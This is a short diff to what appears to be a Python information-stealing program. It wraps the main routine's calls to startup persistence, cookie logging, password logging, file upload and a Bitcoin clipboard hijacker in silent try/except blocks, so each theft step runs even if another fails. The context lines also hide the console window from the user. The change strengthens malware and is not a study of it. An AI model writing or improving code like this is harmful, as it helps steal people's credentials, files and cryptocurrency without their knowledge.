@@ -391,11 +391,26 @@ class Logger():
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         else:
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
-        Logger.startup()
-        Logger.cookieLog()
-        Logger.passwordLog()
-        Logger.uploadFiles()
-        Logger.btcClip()
+        try:
+            Logger.startup()
+        except:
+            pass
+        try:
+            Logger.cookieLog()
+        except:
+            pass
+        try:
+            Logger.passwordLog()
+        except:
+            pass
+        try:
+            Logger.uploadFiles()
+        except:
+            pass
+        try:
+            Logger.btcClip()
+        except:
+            pass
 
 if __name__ == '__main__':
     Logger.start()
